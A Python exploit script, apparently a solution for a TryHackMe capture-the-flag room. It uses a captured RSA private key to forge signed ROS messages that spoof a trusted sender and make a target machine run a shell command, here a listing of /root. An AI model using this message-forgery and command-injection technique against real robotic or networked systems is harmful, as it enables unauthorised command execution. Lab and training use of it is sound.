# script used on tryhackme room https://tryhackme.com/r/room/adventofcyber24sidequest
# T2: Yin and Yang
# script to be run on  yang machine
# script generated wit help of Google Gemini

#!/usr/bin/python3

import rospy
import base64
from yang.msg import Comms  # Use the correct message type
from Cryptodome.Signature import PKCS1_v1_5
from Cryptodome.PublicKey import RSA
from Cryptodome.Hash import SHA256

# Load the captured private key
def load_private_key(key_file="key.txt"):
    with open(key_file, 'rb') as f:
        priv_key = RSA.import_key(f.read())
    return priv_key

# Generate a base64-encoded string for HMAC calculation
def get_base64_hmac_string(message):
    hmac = base64.urlsafe_b64encode(message.timestamp.encode()).decode()
    hmac += "." + base64.urlsafe_b64encode(message.sender.encode()).decode()
    hmac += "." + base64.urlsafe_b64encode(message.receiver.encode()).decode()
    hmac += "." + base64.urlsafe_b64encode(str(message.action).encode()).decode()
    hmac += "." + base64.urlsafe_b64encode(str(message.actionparams).encode()).decode()
    hmac += "." + base64.urlsafe_b64encode(message.feedback.encode()).decode()
    return hmac

# Sign the message using the private key
def sign_message(message, priv_key):
    hmac_str = get_base64_hmac_string(message)
    hmac = SHA256.new(hmac_str.encode('utf-8'))
    signature = PKCS1_v1_5.new(priv_key).sign(hmac)
    message.hmac = base64.b64encode(signature).decode()
    return message

# Craft the malicious message
def craft_malicious_message(priv_key, command):
    rospy.init_node('exploit_node', anonymous=True)  # Initialize the ROS node here
    message = Comms()
    message.timestamp = str(rospy.get_time())
    message.sender = "Yin"  # Spoof the sender as Yin
    message.receiver = "Yang"
    message.action = 1  # Arbitrary action
    message.actionparams = [command]
    message.feedback = "ACTION"
    return sign_message(message, priv_key)

# Publish the message
def publish_message(message):
    messagebus = rospy.Publisher('messagebus', Comms, queue_size=10)
    rospy.sleep(1)  # Allow time for connections
    messagebus.publish(message)

if __name__ == '__main__':
    try:
        priv_key = load_private_key()
        command = "ls -la /root > /tmp/root.txt"  # Replace with actual flag location
        message = craft_malicious_message(priv_key, command)
        publish_message(message)
    except rospy.ROSInterruptException:
        pass
